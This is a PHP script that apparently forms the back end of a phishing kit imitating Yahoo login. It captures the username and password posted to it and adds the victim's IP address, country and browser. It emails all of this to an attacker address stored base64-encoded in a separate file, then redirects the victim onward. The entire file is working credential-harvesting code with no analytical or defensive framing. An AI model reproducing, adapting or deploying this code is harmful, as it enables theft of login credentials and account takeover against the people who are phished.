<?php

function getrealip()
{
 if (isset($_SERVER)){
if(isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
if(strpos($ip,",")){
$exp_ip = explode(",",$ip);
$ip = $exp_ip[0];
}
}else if(isset($_SERVER["HTTP_CLIENT_IP"])){
$ip = $_SERVER["HTTP_CLIENT_IP"];
}else{
$ip = $_SERVER["REMOTE_ADDR"];
}
}else{
if(getenv('HTTP_X_FORWARDED_FOR')){
$ip = getenv('HTTP_X_FORWARDED_FOR');
if(strpos($ip,",")){
$exp_ip=explode(",",$ip);
$ip = $exp_ip[0];
}
}else if(getenv('HTTP_CLIENT_IP')){
$ip = getenv('HTTP_CLIENT_IP');
}else {
$ip = getenv('REMOTE_ADDR');
}
}
return $ip; 
}


$MyipAddress = getrealip();
$ip = $MyipAddress;
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$adddate2=date("D M d, Y");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "U-Name : ".$_POST['e']."\n";
$message .=     "P-Word : ".$_POST['p']."\n";
$message .=     "=============+[ Loc Info ]+===============\n";
$message .=     "I.P-ADD: ".$ip."\n";
$message .=     "===================ONE=================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$message .= 	"Browser: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date/Time: ".$adddate."\n";
$message .=     "===============WITH GOD================\n";
$username = $_POST['e'];
$user = base64_encode($username);
$password = $_POST['p'];
$parts = explode("@",$username);
$string = $parts['1'];


$sni = 'Rez';
$subj = "XXX L0g1n $ip $adddate2\n";
$from = "From: XXX\n";
$email_list = file("2.txt");
$to = base64_decode(implode($email_list));
$c = $_GET['c'];
if(empty($c)){
if(empty($username) || strlen($password) <= 4)  
{
header('Location: src.php?guce_referrer=aHR0cHM6Ly9sb2dpbi55YWhvby5jb20v&guce_referrer_sig=AQAAABA99NmGR9iNQOyU5mI3ASjQfYjcPATD_A8modgjxpNXYNmo8n5zxdi8EZV7GFYPzoSc_RpMz0hYfdCk0OLmxnMB6tpfZnd5ENcxTcI3e56&a=1&0='.$user);
}

else {
mail($to,$subj,$message);
header('Location: src.php?guce_referrer=aHR0cHM6Ly9sb2dpbi55YWhvby5jb20v&guce_referrer_sig=AQAAABA99NmGR9iNQOyU5mI3ASjQfYjcPATD_A8modgjxpNXYNmo8n5zxdi8EZV7GFYPzoSc_RpMz0hYfdCk0OLmxnMB6tpfZnd5ENcxT&c=w&cI3e56&a=2&0='.$user);
}
}
/*Done*/
else{
	
	if(empty($username) || strlen($password) <= 4)  
{
header('Location: src.php?guce_referrer=aHR0cHM6Ly9sb2dpbi55YWhvby5jb20v&guce_referrer_sig=AQAAABA99NmGR9iNQOyU5mI3ASjQfYjcPATD_A8modgjxpNXYNmo8n5zxdi8EZV7GFYPzoSc_RpMz0hYfdCk0OLmxnMB6tpfZnd5ENcxTcI3e56&a=1&0='.$user);
}

else {
mail($to,$subj,$message);
header('Location: sr.php?guce_referrer=aHR0cHM6Ly9sb2dpbi55YWhvby5jb20v&guce_referrer_sig=AQAAABA99NmGR9iNQOyU5mI3ASjQfYjcPATD_A8modgjxpNXYNmo8n5zxdi8EZV7GFYPzoSc_RpMz0hYfdCk0OLmxnMB6tpfZnd5ENcxTcI3e56&0='.$user);

}
	
}
?>